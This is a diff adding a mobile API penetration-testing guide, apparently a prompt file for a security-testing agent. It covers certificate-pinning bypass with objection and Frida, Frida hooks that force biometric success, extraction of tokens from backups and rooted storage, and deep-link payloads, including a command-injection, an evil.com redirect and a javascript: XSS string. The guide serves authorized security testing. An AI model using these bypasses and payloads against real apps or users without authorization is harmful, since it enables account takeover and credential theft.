@@ -1,0 +1,437 @@
+<mobile_api_security_guide>
+<title>MOBILE API SECURITY TESTING</title>
+
+<critical>Mobile APIs face unique security challenges including certificate pinning bypass, token handling vulnerabilities, insecure local storage, and platform-specific attack vectors. Understanding mobile application architecture and API communication patterns is essential for comprehensive testing of mobile backends.</critical>
+
+<scope>
+- Certificate pinning bypass
+- Token storage and handling
+- API authentication weaknesses
+- Biometric authentication bypass
+- Push notification security
+- Deep link exploitation
+- OAuth/OIDC mobile flows
+- Mobile-specific rate limiting
+</scope>
+
+<methodology>
+1. Intercept and analyze mobile API traffic.
+2. Test certificate pinning implementation.
+3. Probe token handling and storage.
+4. Analyze authentication flows.
+5. Test for mobile-specific vulnerabilities.
+</methodology>
+
+<traffic_interception>
+<certificate_pinning_bypass>
+{% raw %}
+# Certificate pinning bypass methods:
+
+# 1. Frida with objection:
+objection -g com.app.name explore
+android sslpinning disable
+ios sslpinning disable
+
+# 2. Frida scripts:
+frida -U -f com.app.name -l pinning-bypass.js --no-pause
+
+# 3. SSL Kill Switch (iOS jailbroken):
+# Cydia package
+
+# 4. Android Network Security Config:
+# Modify res/xml/network_security_config.xml
+# Add user-installed CAs
+
+# 5. Magisk/LSPosed modules:
+# TrustMeAlready, JustTrustMe
+
+# 6. Manual certificate installation:
+# Install Burp/mitmproxy CA on device
+{% endraw %}
+</certificate_pinning_bypass>
+
+<proxy_setup>
+{% raw %}
+# Proxy configuration:
+
+# Android emulator:
+emulator -avd DEVICE_NAME -http-proxy 127.0.0.1:8080
+
+# Android device:
+# Settings > Wi-Fi > Modify network > Manual proxy
+
+# iOS device:
+# Settings > Wi-Fi > Configure Proxy > Manual
+
+# adb reverse proxy:
+adb reverse tcp:8080 tcp:8080
+
+# Invisible proxy (for pinned apps):
+# Configure iptables to redirect traffic
+{% endraw %}
+</proxy_setup>
+</traffic_interception>
+
+<token_security>
+<token_storage>
+{% raw %}
+# Token storage analysis:
+
+# Android storage locations:
+/data/data/com.app.name/shared_prefs/  # SharedPreferences
+/data/data/com.app.name/databases/  # SQLite
+/data/data/com.app.name/files/  # Internal storage
+/sdcard/Android/data/com.app.name/  # External storage
+
+# iOS storage locations:
+# Keychain (secure)
+# NSUserDefaults (insecure)
+# Documents folder
+# Core Data/SQLite
+
+# Vulnerable patterns:
+# - Tokens in SharedPreferences/NSUserDefaults
+# - Tokens in SQLite without encryption
+# - Tokens in logs
+# - Tokens in crash reports
+{% endraw %}
+</token_storage>
+
+<token_handling>
+{% raw %}
+# Token handling vulnerabilities:
+
+# 1. No token refresh:
+# Access token never expires
+# No refresh token mechanism
+
+# 2. Long-lived tokens:
+# Token valid for days/months
+# Check exp claim in JWT
+
+# 3. Token leakage:
+# Token in URL parameters
+# Token in logs
+# Token in analytics/crash reports
+
+# 4. Insufficient token validation:
+# Backend accepts expired tokens
+# Algorithm confusion
+# Missing audience/issuer validation
+
+# 5. Missing token binding:
+# Token reusable on different devices
+# No device fingerprinting
+{% endraw %}
+</token_handling>
+</token_security>
+
+<authentication>
+<mobile_auth_flows>
+{% raw %}
+# Mobile authentication vulnerabilities:
+
+# 1. OAuth/OIDC issues:
+# - Custom URL scheme hijacking
+# - PKCE implementation errors
+# - State parameter missing
+# - Redirect URI validation
+
+# 2. Biometric bypass:
+# - Local authentication only
+# - No server-side verification
+# - Fallback to weak PIN
+
+# 3. Session management:
+# - Session not invalidated on logout
+# - Concurrent sessions allowed
+# - Session fixation
+
+# 4. Password handling:
+# - Password in logs
+# - Password not cleared from memory
+# - Weak password policy
+{% endraw %}
+</mobile_auth_flows>
+
+<biometric_bypass>
+{% raw %}
+# Biometric authentication bypass:
+
+# Android:
+# 1. Frida hook BiometricPrompt:
+Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback")
+    .onAuthenticationSucceeded.implementation = function() {
+        // Force success
+    };
+
+# 2. KeyStore bypass:
+# Modify isUserAuthenticationRequired
+
+# iOS:
+# 1. Frida hook LAContext:
+ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"]
+    .implementation = function(policy, reason, reply) {
+        reply(true, null);  // Force success
+    };
+
+# 2. Keychain access bypass:
+# Modify access control flags
+{% endraw %}
+</biometric_bypass>
+</authentication>
+
+<api_vulnerabilities>
+<mobile_specific_apis>
+{% raw %}
+# Mobile-specific API issues:
+
+# 1. Device registration:
+POST /api/device/register
+{
+  "device_id": "attacker_device",
+  "push_token": "fcm_token"
+}
+# Register as any user's device
+
+# 2. Debug endpoints:
+GET /api/debug
+GET /api/config
+GET /api/version
+# May expose sensitive info in production
+
+# 3. Feature flags:
+GET /api/features
+{
+  "premium_features": true,
+  "admin_mode": false
+}
+# Modify client to enable features
+
+# 4. Missing server-side validation:
+# Trusting client-side calculations
+# Price manipulation, quantity bypass
+{% endraw %}
+</mobile_specific_apis>
+
+<rate_limiting>
+{% raw %}
+# Mobile rate limiting bypass:
+
+# 1. Device ID rotation:
+# Generate new device IDs per request
+X-Device-ID: random_uuid
+
+# 2. Multiple accounts:
+# Rate limit per user, not per IP
+
+# 3. Distributed requests:
+# Mobile networks = different IPs
+
+# 4. No rate limit on mobile endpoints:
+# API designed for web may differ for mobile
+{% endraw %}
+</rate_limiting>
+</api_vulnerabilities>
+
+<deep_links>
+<deep_link_exploitation>
+{% raw %}
+# Deep link vulnerabilities:
+
+# Android (AndroidManifest.xml):
+<intent-filter>
+  <action android:name="android.intent.action.VIEW" />
+  <data android:scheme="myapp" android:host="callback" />
+</intent-filter>
+
+# Attack: Any app can trigger deep link
+adb shell am start -d "myapp://callback?token=stolen"
+
+# iOS (Info.plist):
+<key>CFBundleURLSchemes</key>
+<array><string>myapp</string></array>
+
+# Vulnerabilities:
+# 1. OAuth token in deep link
+# - No verification of source
+# - Token logged
+
+# 2. Command injection via deep link:
+myapp://execute?cmd=id
+
+# 3. Open redirect:
+myapp://redirect?url=https://evil.com
+{% endraw %}
+</deep_link_exploitation>
+
+<app_links>
+{% raw %}
+# App Links / Universal Links:
+
+# Android App Links:
+# - Verified domain ownership
+# - /.well-known/assetlinks.json
+
+# iOS Universal Links:
+# - apple-app-site-association file
+# - HTTPS required
+
+# Verification bypass:
+# Check if fallback to unverified deep links
+# Test assetlinks.json availability
+{% endraw %}
+</app_links>
+</deep_links>
+
+<push_notifications>
+<push_security>
+{% raw %}
+# Push notification vulnerabilities:
+
+# 1. Token theft:
+# FCM/APNs token in requests
+# Attacker can send notifications
+
+# 2. Notification content:
+# Sensitive data in notifications
+# Visible on lock screen
+
+# 3. Deep link in notification:
+# Malicious deep link via push
+{
+  "notification": {
+    "title": "Click here",
+    "click_action": "myapp://phishing"
+  }
+}
+
+# 4. Silent notifications:
+# Background data sync abuse
+# Tracking via push notifications
+{% endraw %}
+</push_security>
+</push_notifications>
+
+<local_storage>
+<data_exposure>
+{% raw %}
+# Local data exposure:
+
+# Android:
+# 1. Backup extraction:
+adb backup -f backup.ab com.app.name
+abe unpack backup.ab backup.tar
+
+# 2. Root access:
+adb shell
+su
+cat /data/data/com.app.name/shared_prefs/*.xml
+
+# iOS:
+# 1. iTunes backup:
+# Unencrypted backup extraction
+
+# 2. Jailbroken device:
+# Direct file system access
+
+# Common findings:
+# - Credentials in plain text
+# - Session tokens
+# - Personal data
+# - API keys
+{% endraw %}
+</data_exposure>
+</local_storage>
+
+<binary_analysis>
+<static_analysis>
+{% raw %}
+# Mobile binary analysis:
+
+# Android (APK):
+# 1. Decompile:
+apktool d app.apk
+jadx app.apk
+
+# 2. Search for secrets:
+grep -r "api_key\|secret\|password\|token" ./
+
+# 3. Check for debugging:
+# android:debuggable="true"
+
+# iOS (IPA):
+# 1. Extract:
+unzip app.ipa
+
+# 2. Analyze binary:
+strings App.app/App | grep -i "key\|secret\|api"
+
+# 3. Check for debugging:
+otool -L App.app/App
+{% endraw %}
+</static_analysis>
+</binary_analysis>
+
+<common_payloads>
+{% raw %}
+# Certificate pinning bypass:
+objection -g com.app explore
+android sslpinning disable
+
+# Token manipulation:
+Authorization: Bearer <modified_jwt>
+
+# Deep link:
+myapp://callback?token=stolen
+myapp://redirect?url=javascript:alert(1)
+
+# Device spoofing:
+X-Device-ID: victim_device_id
+User-Agent: Mobile-App/1.0
+
+# Biometric bypass (Frida):
+Java.use("class").method.implementation = function() { return true; }
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate certificate pinning bypass with traffic interception.
+2. Show token theft from insecure storage.
+3. Prove biometric authentication bypass.
+4. Document deep link exploitation.
+5. Provide evidence of API authentication weakness.
+</validation>
+
+<false_positives>
+- Proper certificate pinning with multiple pins
+- Tokens in Keychain/KeyStore with proper flags
+- Server-side biometric verification
+- App Links/Universal Links properly verified
+- Debug endpoints disabled in production
+</false_positives>
+
+<impact>
+- Traffic interception and credential theft
+- Account takeover via token theft
+- Authentication bypass
+- Privilege escalation via deep links
+- Sensitive data exposure from storage
+- Push notification abuse
+</impact>
+
+<pro_tips>
+1. Always test with both jailbroken/rooted and stock devices.
+2. Frida with objection is the most reliable pinning bypass.
+3. Check all storage locations for sensitive data.
+4. OAuth on mobile requires PKCE - test its implementation.
+5. Deep links are a common attack vector - enumerate all.
+6. Binary analysis reveals hardcoded secrets.
+7. Test token behavior across app reinstalls.
+8. Mobile APIs often lack rate limiting.
+9. Push tokens can enable notification hijacking.
+10. Backup extraction works on non-rooted devices.
+</pro_tips>
+
+<remember>Mobile API security requires testing both the client application and the backend API. Certificate pinning bypass is the first step to traffic analysis. Focus on token handling, local storage security, and mobile-specific attack vectors like deep links and push notifications.</remember>
+</mobile_api_security_guide>
